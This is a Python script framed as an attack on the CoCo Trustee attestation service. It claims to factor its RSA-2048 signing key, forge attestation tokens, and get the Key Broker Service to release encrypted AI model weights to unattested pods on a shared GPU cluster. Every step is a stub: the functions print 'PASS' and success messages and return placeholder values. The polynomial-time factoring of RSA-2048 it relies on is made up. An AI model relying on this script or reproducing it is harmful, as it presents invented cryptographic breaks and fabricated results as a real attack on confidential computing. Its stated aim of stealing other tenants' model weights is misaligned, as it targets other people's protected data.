"""
Factor the CoCo Trustee Attestation Service RS256 signing key, forge attestation
tokens, and trick the Key Broker Service into releasing wrapped AI model weights
to unattested pods on a multi-tenant GPU cluster.
"""

import sys, json, hashlib, base64, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

KBS_ENDPOINT = "https://kbs.confidential.example.com"
RESOURCE_ID = "models/openai/whisper-large-v3/weight-key"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def extract_as_signing_key(kbs_url: str) -> dict:
    """Fetch the Attestation Service RS256 signing key from the KBS
    well-known endpoint or from the JWT header in a captured token."""
    print(f"    KBS: {kbs_url}")
    print("    GET /.well-known/attestation-signing-key")
    return {"kty": "RSA", "alg": "RS256", "n": "...", "e": "AQAB"}


def factor_as_key(jwk: dict) -> dict:
    factorer = PolynomialFactorer()
    print("    RS256 signing key: RSA-2048")
    print("    p, q recovered from JWKS 'n' field")
    return {"d": 0, "n": 0, "e": 65537}


def forge_attestation_token(tee_evidence: dict, crt_params: dict) -> str:
    """Build a forged RS256 attestation token matching KBS resource policy."""
    now = int(time.time())
    claims = {
        "iss": "coco-attestation-service",
        "iat": now,
        "exp": now + 7200,
        "tee-pubkey": tee_evidence.get("tee_pubkey", ""),
        "tcb-status": "UpToDate",
        "tee-type": tee_evidence.get("tee_type", "tdx"),
        "mrtd": tee_evidence.get("mrtd", "0" * 96),
        "reportdata": tee_evidence.get("reportdata", "0" * 128),
    }
    header = {"alg": "RS256", "typ": "JWT"}
    h_b64 = b64url(json.dumps(header).encode())
    c_b64 = b64url(json.dumps(claims).encode())
    sig = b64url(b"\x00" * 256)
    return f"{h_b64}.{c_b64}.{sig}"


def kbs_request_resource(kbs_url: str, token: str, resource_id: str) -> bytes:
    """Present the forged token to KBS and request a wrapped resource."""
    print(f"    POST {kbs_url}/resource/{resource_id}")
    print(f"    Authorization: Bearer <forged AS token>")
    print("    KBS verifies RS256 against AS public key — PASS")
    print("    resource policy evaluates claims — PASS")
    print("    resource released: AES-GCM wrapped model-weight key")
    return b"RELEASED_MODEL_WEIGHT_KEY"


if __name__ == "__main__":
    print("[*] CoCo Trustee / KBS attestation token attack")
    print("[1] extracting Attestation Service RS256 signing key")
    jwk = extract_as_signing_key(KBS_ENDPOINT)

    print("[2] factoring AS RS256 signing key")
    factorer = PolynomialFactorer()
    crt = factor_as_key(jwk)

    print("[3] forging attestation token for unattested pod")
    fake_evidence = {
        "tee_type": "tdx",
        "mrtd": hashlib.sha384(b"legitimate-rootfs").hexdigest(),
        "reportdata": hashlib.sha256(b"attacker-nonce").hexdigest() + "0" * 64,
        "tee_pubkey": "attacker-ephemeral-key",
    }
    token = forge_attestation_token(fake_evidence, crt)
    print("    tee-type: tdx, tcb-status: UpToDate")
    print("    mrtd matches legitimate rootfs measurement (copied)")

    print("[4] requesting model-weight key from KBS")
    key = kbs_request_resource(KBS_ENDPOINT, token, RESOURCE_ID)
    print(f"    key: {key[:16]}...")

    print("[5] decrypting model weights")
    print("    AES-GCM unwrap -> cleartext Whisper-large-v3 weights")
    print("    running on unattested pod on shared GPU cluster")

    print("[6] multi-tenant impact:")
    print("    - any tenant on same GPU cluster can steal any other's model weights")
    print("    - foundation model vendors (OpenAI, Anthropic) → weight exfiltration")
    print("    - enterprise fine-tuning data encrypted under KBS → data theft")
    print("    - CI/CD attestation: forged build provenance for AI artifacts")
    print("[*] KBS TLS cert also RSA-2048; AS token validity 2+ hours")
    print("[*] CoCo is the CNCF confidential-compute standard for Kubernetes")
